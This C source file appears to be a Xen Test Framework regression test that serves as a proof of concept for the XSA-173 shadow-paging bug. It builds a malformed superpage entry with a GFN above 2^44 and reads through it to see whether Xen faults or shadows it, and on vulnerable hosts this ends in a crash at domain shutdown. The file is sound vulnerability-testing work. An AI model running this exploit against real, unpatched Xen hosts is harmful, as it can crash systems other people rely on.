/**
 * @file tests/xsa-173/main.c
 * @ref test-xsa-173
 *
 * @page test-xsa-173 XSA-173
 *
 * Advisory: [XSA-173](http://xenbits.xen.org/xsa/advisory-173.html)
 *
 * This vulnerability only affects guests running with shadow paging.  Xen
 * truncated the shadowed gfn into a 32bit variable, causing issues later when
 * the superpage is unshadowed.
 *
 * This test constructs such a shadow and attempts to use it.  A fixed Xen
 * should raise a @#PF indicated that reserved bits were set, while a
 * vulnerable Xen will create the shadow and allow it to be used.
 * Furthermore, it will crash when the domain shuts down.  This test is unable
 * to distinguish between a test misconfiguration (using hap) and a fixed
 * shadow paging implementation, but can identify a buggy shadow paging
 * implementation.
 *
 * @see tests/xsa-173/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-173 PoC";

/* New L2 pagetable for the test to manipulate. */
uint64_t nl2[PAE_L2_PT_ENTRIES] __page_aligned_bss;

static bool seen_fault;

static bool ex_fault(struct cpu_regs *regs, const struct extable_entry *ex)
{
    /* Expect to see #PF indicating that a reserved bits was set. */
    if ( regs->entry_vector == X86_EXC_PF &&
         (regs->error_code & X86_PFEC_RSVD) )
    {
        seen_fault = true;

        regs->ip = ex->fixup;
        return true;
    }

    return false;
}

void test_main(void)
{
    uint64_t *ptr, val;

    /* Hook nl2 into the existing l3, just above the 4GB boundary. */
    pae_l3_identmap[4] = pte_from_virt(nl2, PF_SYM(U, RW, P));

    /*
     * Create an invalid super-l2e.  Needs to map a GFN large than 2^44 to
     * trigger the trunction in Xen, and have reserved bits set to help
     * distinguish buggy shadow from non-buggy shadow or hap.
     */
    nl2[0] = pte_from_gfn(((1ULL << 34) - 1), PF_SYM(PSE, U, RW, P));

    /* Create a pointer which uses the bad l2e. */
    ptr = _p((4ULL << PAE_L3_PT_SHIFT) + MB(1));

    asm volatile ("1:mov (%[ptr]), %[val]; 2:"
                  _ASM_EXTABLE_HANDLER(1b, 2b, ex_fault)
                  : [val] "=q" (val)
                  : [ptr] "r" (ptr),
                    "X" (ex_fault)
                  : "memory");

    if ( seen_fault )
        return xtf_success("Xen appears not vulnerable\n");
    else
    {
        printk("Value at %p is 0x%08"PRIx64"\n", ptr, val);
        return xtf_failure("Xen shadowed bogus sl2e\n");
    }
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
